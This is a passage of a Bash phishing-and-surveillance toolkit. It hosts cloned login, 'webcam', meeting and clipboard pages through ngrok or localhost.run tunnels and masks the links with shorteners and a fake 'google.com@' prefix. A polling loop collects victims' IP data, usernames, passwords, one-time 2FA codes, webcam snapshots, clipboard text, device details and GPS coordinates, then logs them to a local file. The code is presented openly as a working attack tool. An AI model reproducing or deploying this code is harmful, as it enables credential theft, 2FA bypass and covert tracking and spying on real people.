    echo -e "${greenbold}[${reset}*${greenbold}] Server FTP Online ${Y}."
    qrencode -m 5 -s 10 -o QRCode.png ${link} > /dev/null 2>&1 &
    feh QRCode.png > /dev/null 2>&1 &
    sleep infinity
    fi

    if [[ ${site} == "webcam" && ${webcam_menu} == "01" ]] || [[ ${site} == "webcam" && ${webcam_menu} == "1" ]];then
    cd ${script_dir}/.sites/${site}/ || exit_script
    sed 's+forwarding_link+'${link}'+g' indextemplate.php > index.php
    sed 's+forwarding_link+'${link}'+g; s+live_yt_tv+'${webcam_youtube_template}'+g' Youtube.html > index2.html
    cd ${script_dir}/ || exit_script
    elif [[ ${site} == "webcam" && ${webcam_menu} == "02" ]] || [[ ${site} == "webcam" && ${webcam_menu} == "2" ]];then
    cd ${script_dir}/.sites/${site}/ || exit_script
    sed 's+forwarding_link+'${link}'+g' indextemplate.php > index.php
    sed 's+forwarding_link+'${link}'+g' Meeting.html > index2.html
    cd ${script_dir}/ || exit_script
    elif [[ ${site} == "webcam" && ${webcam_menu} == "03" ]] || [[ ${site} == "webcam" && ${webcam_menu} == "3" ]];then
    cd ${script_dir}/.sites/${site}/ || exit_script
    sed 's+forwarding_link+'${link}'+g' indextemplate.php > index.php
    sed 's+forwarding_link+'${link}'+g' Hello.html > index2.html
    cd ${script_dir}/ || exit_script
    fi

    if [[ -z ${link} ]];then
    clear
    banner
    echo -e "${redbold}[${reset}*${redbold}] ERROR LINK NOT FOUND 404.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] CHECK INTERNET CONNECTION.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] CHECK NGROK AUTH TOKEN.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] TRY AGAIN.${reset}"
    sleep 10
    exit_script
    fi

    qrencode -m 5 -s 10 -o QRCode.png ${link} > /dev/null 2>&1 &
    feh QRCode.png > /dev/null 2>&1 &

    wait_credentials
}

#Start SSH Server
ssh_start(){

    if [[ ${site} == "ftp" ]];then
    rm -rf ${script_dir}/.sites/${site}/app/cache/ > /dev/null 2>&1 &
    fi

    clear
    banner
    php_starting
    sleep 3
    cd ${script_dir}/.sites/${site}/ || exit_script
    php -S ${host}:${port} > /dev/null 2>&1 &
    cd ${script_dir}/ || exit_script
    clear
    banner
    php_started
    sleep 2
    clear
    banner
    ssh_starting
    sleep 3
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:'${host}':'${port}' nokey@localhost.run 2> /dev/null > '${script_dir}/.files/link'' &
    clear
    banner
    ssh_started
    sleep 2
    clear
    banner
    sleep 2
    link=$(head -n 1 ${script_dir}/.files/link | grep -o 'https://[^\"]*')
    shorturl=$(curl -s "http://tinyurl.com/api-create.php?url=${link}" | head -n1)
    ssh_short_hidden=$(curl -s --data "url=${link}&shorturl=&opt=0" https://is.gd/create.php | html2text | grep "https" | head -n 1 | sed 's/\[//' | sed 's/\]//' | sed 's/https:\/\///')
	ssh_short_hidden_result_google="https://www.google.com%7AGoogle%Oficial@${ssh_short_hidden}"
    
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Link Local:${reset} http://${host}:${port}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Online:${reset} ${link}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short:${reset} ${shorturl}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short Hidden:${reset} ${ssh_short_hidden_result_google}"
    echo -e "${greenbold}[${reset}*${greenbold}] QR Code:${reset} ${script_dir}/QRCode.png"
    echo -e ""

    if [[ ${site} == "ftp" ]];then
    clear
    banner
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Link Local:${reset} http://${host}:${port}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Online:${reset} ${link}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short:${reset} ${shorturl}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short Hidden:${reset} ${ssh_short_hidden_result_google}"
    echo -e "${greenbold}[${reset}*${greenbold}] QR Code:${reset} ${script_dir}/QRCode.png"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Server FTP Online ${Y}."
    qrencode -m 5 -s 10 -o QRCode.png ${link} > /dev/null 2>&1 &
    feh QRCode.png > /dev/null 2>&1 &
    sleep infinity
    fi

    if [[ ${site} == "webcam" && ${webcam_menu} == "01" ]] || [[ ${site} == "webcam" && ${webcam_menu} == "1" ]];then
    cd ${script_dir}/.sites/${site}/ || exit_script
    sed 's+forwarding_link+'${link}'+g' indextemplate.php > index.php
    sed 's+forwarding_link+'${link}'+g; s+live_yt_tv+'${webcam_youtube_template}'+g' Youtube.html > index2.html
    cd ${script_dir}/ || exit_script
    elif [[ ${site} == "webcam" && ${webcam_menu} == "02" ]] || [[ ${site} == "webcam" && ${webcam_menu} == "2" ]];then
    cd ${script_dir}/.sites/${site}/ || exit_script
    sed 's+forwarding_link+'${link}'+g' indextemplate.php > index.php
    sed 's+forwarding_link+'${link}'+g' Meeting.html > index2.html
    cd ${script_dir}/ || exit_script
    elif [[ ${site} == "webcam" && ${webcam_menu} == "03" ]] || [[ ${site} == "webcam" && ${webcam_menu} == "3" ]];then
    cd ${script_dir}/.sites/${site}/ || exit_script
    sed 's+forwarding_link+'${link}'+g' indextemplate.php > index.php
    sed 's+forwarding_link+'${link}'+g' Hello.html > index2.html
    cd ${script_dir}/ || exit_script
    fi

    if [[ -z ${link} ]];then
    clear
    banner
    echo -e "${redbold}[${reset}*${redbold}] ERROR LINK NOT FOUND 404.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] CHECK INTERNET CONNECTION.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] TRY AGAIN.${reset}"
    sleep 10
    exit_script
    fi

    qrencode -m 5 -s 10 -o QRCode.png ${link} > /dev/null 2>&1 &
    feh QRCode.png > /dev/null 2>&1 &

    wait_credentials
}

#Wait For Credentials
wait_credentials(){
    echo -e "${orangebold}[${reset}*${orangebold}] Waiting victim open the link...${reset}"

    while true;do

    if [[ -f "${script_dir}/.sites/${site}/IP" ]];then
    echo -e ""
    get_ip
    rm -rf ${script_dir}/.sites/${site}/IP
    fi

    sleep 0.5

    if [[ -f "${script_dir}/.sites/${site}/ACCOUNT" ]];then
    get_account
    rm -rf ${script_dir}/.sites/${site}/ACCOUNT
    fi

    sleep 0.5

    if [[ -f "${script_dir}/.sites/${site}/PASSWORD" ]];then
    get_password
    rm -rf ${script_dir}/.sites/${site}/PASSWORD
    fi

    sleep 0.5

    if [[ -f "${script_dir}/.sites/${site}/OTP" ]];then
    get_otp
    rm -rf ${script_dir}/.sites/${site}/OTP
    fi

    sleep 0.5

    if [[ -f "${script_dir}/.sites/${site}/RECEIVED" ]];then
    get_png
    rm -rf ${script_dir}/.sites/${site}/RECEIVED
    fi

    sleep 0.5
   
    if [[ -f "${script_dir}/.sites/${site}/php/INFO" ]];then
    echo -e ""
    get_info
    rm -rf ${script_dir}/.sites/${site}/php/INFO
    fi

    sleep 0.5

    if [[ -f "${script_dir}/.sites/${site}/php/LOCATION" ]];then
    get_location
    rm -rf ${script_dir}/.sites/${site}/php/LOCATION
    fi

    sleep 0.5

    if [[ -f "${script_dir}/.sites/${site}/CLIPBOARD" ]];then
    get_clip
    fi

    done
}

#Get IP Info
get_ip(){
    if [[ -f "${script_dir}/.sites/${site}/IPINFO" ]];then
    rm -rf ${script_dir}/.sites/${site}/IPINFO
    fi

    ip=$(grep -a 'IP:' ${script_dir}/.sites/${site}/IP | cut -d " " -f2 | tr -d '\r')
    ua=$(grep -a 'User-Agent:' ${script_dir}/.sites/${site}/IP | cut -d " " -f2- | tr -d '\r')
    echo -e "${greenbold}[${reset}*${greenbold}] IP:${reset} ${ip}"
    echo -e "${greenbold}[${reset}*${greenbold}] User-Agent:${reset} ${ua}"

    ipinfo=$(curl -s -L "http://ip-api.com/json/${ip}?fields=continent,continentCode,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,query" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > ${script_dir}/.sites/${site}/IPINFO)
  
    query=$(grep -o '"query":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${query} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Hostname:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Hostname:${reset}" ${query}
    fi

    reverse=$(grep -o '"reverse":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${reverse} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Reverse:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Reverse:${reset}" ${reverse}
    fi
    
    continent=$(grep -o '"continent":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${continent} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Continent:${reset} Unknow"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Continent:${reset}" ${continent}
    fi

    continentcode=$(grep -o '"continentCode":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${continent} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Continent Code:${reset} Unknow"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Continent Code:${reset}" ${continentcode}
    fi

    country=$(grep -o '"country":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${country} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Country:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Country:${reset}" ${country}
    fi

    cc=$(grep -o '"countryCode":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${cc} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Country Code:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Country Code:${reset}" ${cc}
    fi
    
    rn=$(grep -o '"regionName":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${rn} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Region:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Region:${reset}" ${rn}
    fi

    city=$(grep -o '"city":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${city} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] City:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] City:${reset}" ${city}
    fi

    zip=$(grep -o '"zip":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${zip} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ZIP:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ZIP:${reset}" ${zip}
    fi

    tz=$(grep -o '"timezone":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${tz} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Time Zone:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Time Zone:${reset}" ${tz}
    fi

    currency=$(grep -o '"currency".*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${currency} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Currency:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Currency:${reset}" ${currency}
    fi

    isp=$(grep -o '"isp".*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${isp} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ISP:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ISP:${reset}" ${isp}
    fi

    org=$(grep -o '"org":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${org} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ORG:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ORG:${reset}" ${org}
    fi
    
    as=$(grep -o '"as":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${as} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] AS:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] AS:${reset}" ${as}
    fi

    asname=$(grep -o '"asname":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${asname} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] AS Name:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] AS Name:${reset}" ${asname}
    fi

    lan=$(grep -o '"lat":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
    lon=$(grep -o '"lon":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
    if [[ ${lan} == "" || ${lon} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Google Maps:${reset} Unknown"
    else
    link_maps="https://www.google.com/maps/place/${lan},${lon}"
    echo -e "${greenbold}[${reset}*${greenbold}] Google Maps:${reset}" ${link_maps}
    rm -rf ${script_dir}/.sites/${site}/IPINFO
    fi

    if [[ ${site} == *clipboard/sendtext* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Text:${reset} ${clipboard_send_text} ${greenbold}has been sent.${reset}"
    fi

    rm -rf ${script_dir}/.sites/${site}/IPINFO > /dev/null 2>&1 &

    sleep 0.5

    save="
    [*] NEW ACCOUNT + IP [*]
    [*] Date: ${date}
    [*] Hour: $(date +"%H:%M")
    [*] IP: ${ip}
    [*] User-Agent: ${ua}
    [*] Hostname: ${query}
    [*] Continent: ${continent}
    [*] Continent Code: ${continentcode}
    [*] Country: ${country}
    [*] Country Code: ${cc}
    [*] Region: ${rn}
    [*] City: ${city}
    [*] ZIP: ${zip}
    [*] Time Zone: ${tz}
    [*] Currency: ${currency}
    [*] ISP: ${isp}
    [*] ORG: ${org}
    [*] AS: ${as}
    [*] AS Name: ${asname}
    [*] Google Maps: ${link_maps}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"
    cd ${script_dir}/ || exit_script
}

#Get Account / Username / PhoneNumber / Email
get_account(){
    account=$(grep -o 'Account:.*' ${script_dir}/.sites/${site}/ACCOUNT | cut -d " " -f2)
    if [[ ${account} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Account:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Account:${reset}" ${account}
    fi
    sleep 0.5
    save="    [*] Account: ${account}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"
}

#Get Password
get_password(){
    password=$(grep -o 'Password:.*' ${script_dir}/.sites/${site}/PASSWORD | cut -d " " -f2)
    if [[ ${password} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Password:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Password:${reset}" ${password}
    fi
    sleep 0.5
    save="    [*] Password: ${password}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"
}

#Get OTP / TWO FACTOR / AUTH CODE / SMS
get_otp(){
    otp=$(grep -o 'OTP:.*' ${script_dir}/.sites/${site}/OTP | cut -d " " -f2)
    if [[ ${otp} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] OTP:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] OTP:${reset}" ${otp}
    fi
    sleep 0.5
    save="    [*] OTP: ${otp}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"
}

#Message Picture Saved
get_png(){
    sleep 0.5
    mv "${script_dir}/.sites/${site}/"*.png "${script_dir}/DATA/PICTURES/"
    echo -e "${greenbold}[${reset}*${greenbold}] PICTURE SAVED IN:${reset} (DATA/PICTURES)"
}

#Hardware And Software Info
get_info(){
    cd ${script_dir}/.sites/${site}/php/ || exit_script

    os=$(jq ".dev[].os" INFO | tr -d \")
    if [[ ${os} == "" ]] || [[ ${os} == "null" ]] || [[ ${os} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] OS:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] OS:${reset}" ${os}
    fi

    platform=$(jq ".dev[].platform" INFO | tr -d \")
    if [[ ${platform} == "" ]] || [[ ${platform} == "null" ]] || [[ ${platform} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Platform:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Platform:${reset} ${platform}"
    fi

    cpucores=$(jq ".dev[].cores" INFO | tr -d \")
    if [[ ${cpucores} == "" ]] || [[ ${cpucores} == "null" ]] || [[ ${cpucores} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] CPU Cores:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] CPU Cores:${reset} ${cpucores}"
    fi

    ram=$(jq ".dev[].ram" INFO | tr -d \")
    if [[ ${ram} == "" ]] || [[ ${ram} == "null" ]] || [[ ${ram} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] RAM:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] RAM:${reset} ${ram}"
    fi
    
    gpuvendor=$(jq ".dev[].vendor" INFO | tr -d \")
    if [[ ${gpuvendor} == "" ]] || [[ ${gpuvendor} == "null" ]] || [[ ${gpuvendor} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] GPU Vendor:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] GPU Vendor:${reset} ${gpuvendor}"
    fi

    gpu=$(jq ".dev[].render" INFO | tr -d \")
    if [[ ${gpu} == "" ]] || [[ ${gpu} == "null" ]] || [[ ${gpu} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] GPU:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] GPU:${reset} ${gpu}"
    fi

    wd=$(jq ".dev[].wd" INFO | tr -d \")
    ht=$(jq ".dev[].ht" INFO | tr -d \")
    resolution="${wd}"x"${ht}"
    if [[ ${resolution} == "" ]] || [[ ${resolution} == "null" ]] || [[ ${resolution} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Resolution:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Resolution:${reset} ${resolution}"
    fi

    browser=$(jq ".dev[].browser" INFO | tr -d \")
    if [[ ${browser} == "" ]] || [[ ${browser} == "null" ]] || [[ ${browser} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Browser:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Browser:${reset} ${browser}"
    fi

    publicip=$(jq ".dev[].ip" INFO | tr -d \")
    location=$(curl -s -L "http://ip-api.com/json/${publicip}?fields=continent,continentCode,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,org,as,asname,query" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > ${script_dir}/.sites/${site}/IPINFO)
    
    query=$(grep -o '"query":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${query} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Hostname:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Hostname:${reset}" ${query}
    fi
    
    continent=$(grep -o '"continent":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${continent} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Continent:${reset} Unknow"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Continent:${reset}" ${continent}
    fi

    continentcode=$(grep -o '"continentCode":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${continent} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Continent Code:${reset} Unknow"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Continent Code:${reset}" ${continentcode}
    fi

    country=$(grep -o '"country":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${country} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Country:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Country:${reset}" ${country}
    fi

    cc=$(grep -o '"countryCode":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${cc} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Country Code:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Country Code:${reset}" ${cc}
    fi
    
    rn=$(grep -o '"regionName":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${rn} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Region:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Region:${reset}" ${rn}
    fi

    city=$(grep -o '"city":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${city} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] City:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] City:${reset}" ${city}
    fi

    zip=$(grep -o '"zip":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${zip} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ZIP:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ZIP:${reset}" ${zip}
    fi

    tz=$(grep -o '"timezone":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${tz} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Time Zone:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Time Zone:${reset}" ${tz}
    fi

    currency=$(grep -o '"currency".*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${currency} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Currency:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Currency:${reset}" ${currency}
    fi

    isp=$(grep -o '"isp".*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${isp} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ISP:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ISP:${reset}" ${isp}
    fi

    org=$(grep -o '"org":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${org} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ORG:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ORG:${reset}" ${org}
    fi
    
    as=$(grep -o '"as":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${as} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] AS:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] AS:${reset}" ${as}
    fi

    asname=$(grep -o '"asname":.*' ${script_dir}/.sites/${site}/IPINFO | cut -d '"' -f4)
    if [[ ${asname} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] AS Name:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] AS Name:${reset}" ${asname}
    fi

    rm -rf ${script_dir}/.sites/${site}/IPINFO > /dev/null 2>&1 &

    sleep 0.5

    save="
    [*] NEW LOCATION + IP + HARDWARE + SOFTWARE [*]
    [*] Date: ${date}
    [*] Hour: $(date +"%H:%M")
    [*] Hostname: ${query}
    [*] Continent: ${continent}
    [*] Continent Code: ${continentcode}
    [*] Country: ${country}
    [*] Country Code: ${cc}
    [*] Region: ${rn}
    [*] City: ${city}
    [*] ZIP: ${zip}
    [*] Time Zone: ${tz}
    [*] Currency: ${currency}
    [*] ISP: ${isp}
    [*] ORG: ${org}
    [*] AS: ${as}
    [*] AS Name: ${asname}
    [*] OS: ${os}
    [*] Platform: ${platform}
    [*] CPU Cores: ${cpucores}
    [*] RAM: ${ram}
    [*] GPU Vendor: ${gpuvendor}
    [*] GPU: ${gpu}
    [*] Resolution: ${resolution}
    [*] Browser: ${browser}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"

    cd ${script_dir}/ || exit_script
}

#Get Location
get_location(){
    cd ${script_dir}/.sites/${site}/php/ || exit_script

    latitude=$(jq ".info[].lat" LOCATION | tr -d \")
    if [[ ${latitude} == "" ]] || [[ ${latitude} == "null" ]] || [[ ${latitude} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Latitude:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Latitude:${reset} ${latitude}"
    fi

    longitude=$(jq ".info[].lon" LOCATION | tr -d \")
    if [[ ${longitude} == "" ]] || [[ ${longitude} == "null" ]] || [[ ${longitude} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Longitude:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Longitude:${reset} ${longitude}"
    fi

    accuracy=$(jq ".info[].acc" LOCATION | tr -d \")
    if [[ ${accuracy} == "" ]] || [[ ${accuracy} == "null" ]] || [[ ${accuracy} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Accuracy:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Accuracy:${reset} ${accuracy}"
    fi

    altitude=$(jq ".info[].alt" LOCATION | tr -d \")
    if [[ ${altitude} == "" ]] || [[ ${altitude} == "null" ]] || [[ ${altitude} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Altitude:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Altitude:${reset} ${altitude}"
    fi

    direction=$(jq ".info[].dir" LOCATION | tr -d \")
    if [[ ${direction} == "" ]] || [[ ${direction} == "null" ]] || [[ ${direction} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Direction:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Direction:${reset} ${direction}"
    fi

    speed=$(jq ".info[].spd" LOCATION | tr -d \")
    if [[ ${speed} == "" ]] || [[ ${speed} == "null" ]] || [[ ${speed} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Speed:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Speed:${reset} ${speed}"
    fi

    locationmap="https://www.google.com/maps/place/${latitude},${longitude}"
    if [[ ${locationmap} == "" ]] || [[ ${locationmap} == "null" ]] || [[ ${locationmap} == "Not Available" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Google Maps:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Google Maps:${reset}" ${locationmap}
    fi

    sleep 0.5

    save="    [*] Latitude: ${latitude}
    [*] Longitude: ${longitude}
    [*] Accuracy: ${accuracy}
    [*] Altitude: ${altitude}
    [*] Direction: ${direction}
    [*] Speed: ${speed}
    [*] Google Maps: ${locationmap}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"

    cd ${script_dir}/ || exit_script
}

#Get Clip Info
get_clip(){
    catclipboard=$(cat ${script_dir}/.sites/${site}/CLIPBOARD)
    echo -e ""
    echo -e "${greenbold}[${reset}↓${greenbold}] ---- TEXT COPIED ---- [${reset}↓${greenbold}]${reset}${orangebold}\n${catclipboard}\n${reset}${greenbold}[${reset}↑${greenbold}] ---- TEXT COPIED ---- [${reset}↑${greenbold}]${reset}"
    saveclip="
    [↓] ---- TEXT COPIED ---- [↓]
${catclipboard}
    [↑] ---- TEXT COPIED ---- [↑]"
    echo "${saveclip}" >> "${script_dir}/DATA/INFORMATION"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Text Saved In -->${reset} ${script_dir}/DATA/INFORMATION"
    rm -rf ${script_dir}/.sites/${site}/CLIPBOARD
}

#Staring PHP Server
php_starting(){
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}] STARTING PHP SERVER [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
}

#PHP Server Started
php_started(){
    echo -e "${greenbold}"
    echo -e "                         --------------------   "
    echo -e "                      [${reset}*${greenbold}] PHP SERVER STARTED [${reset}*${greenbold}]"
    echo -e "                         --------------------   "
    echo -e "${reset}"
}

#Starting NGROK Server
ngrok_starting(){
    echo -e "${orangebold}"
    echo -e "                       -----------------------   "
    echo -e "                    [${reset}*${orangebold}] STARTING NGROK SERVER [${reset}*${orangebold}]"
    echo -e "                       -----------------------   "
    echo -e "${reset}"
}

#NGROK Server Started
ngrok_started(){
    echo -e "${greenbold}"
    echo -e "                        ----------------------   "
    echo -e "                     [${reset}*${greenbold}] NGROK SERVER STARTED [${reset}*${greenbold}]"
    echo -e "                        ----------------------   "
    echo -e "${reset}"
}

#Staring SSH Server
ssh_starting(){
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}] STARTING SSH SERVER [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
